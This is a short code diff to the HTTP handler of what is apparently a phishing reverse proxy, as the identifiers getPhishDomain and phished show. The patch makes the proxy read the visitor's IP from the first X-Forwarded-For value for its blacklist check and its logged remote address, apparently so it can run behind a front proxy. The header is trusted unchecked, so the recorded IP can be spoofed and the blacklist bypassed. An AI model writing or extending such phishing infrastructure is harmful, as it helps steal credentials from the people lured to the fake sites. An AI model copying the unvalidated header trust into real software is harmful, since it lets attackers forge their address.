@@ -150,7 +150,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			hiblue := color.New(color.FgHiBlue)
 
 			// handle ip blacklist
-			from_ip := req.RemoteAddr
+			xff_val, xff_present := req.Header["X-Forwarded-For"]
+
+			var from_ip string
+			
+			if xff_present {
+				ips := strings.Split(xff_val[0], ",")
+				from_ip = strings.TrimSpace(ips[0])
+			} else { 
+				from_ip = req.RemoteAddr
+			}
+
 			if strings.Contains(from_ip, ":") {
 				from_ip = strings.Split(from_ip, ":")[0]
 			}
@@ -186,8 +196,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			//log.Debug("http: %s", req_url)
 
-			parts := strings.SplitN(req.RemoteAddr, ":", 2)
-			remote_addr := parts[0]
+			var remote_addr string;
+
+			if xff_present {
+				ips := strings.Split(xff_val[0], ",")
+				remote_addr = strings.TrimSpace(ips[0])
+			} else { 
+				parts := strings.SplitN(req.RemoteAddr, ":", 2)
+				remote_addr = parts[0]
+			}
 
 			phishDomain, phished := p.getPhishDomain(req.Host)
 			if phished {
